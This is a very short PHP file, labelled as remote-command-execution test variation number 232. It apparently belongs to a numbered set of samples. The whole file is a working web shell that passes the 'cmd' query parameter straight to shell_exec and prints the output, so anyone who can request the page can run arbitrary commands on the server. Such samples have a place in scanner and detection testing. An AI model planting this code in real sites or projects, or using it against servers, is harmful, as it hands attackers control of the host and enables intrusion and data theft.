<?php
// RCE test variation #232
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>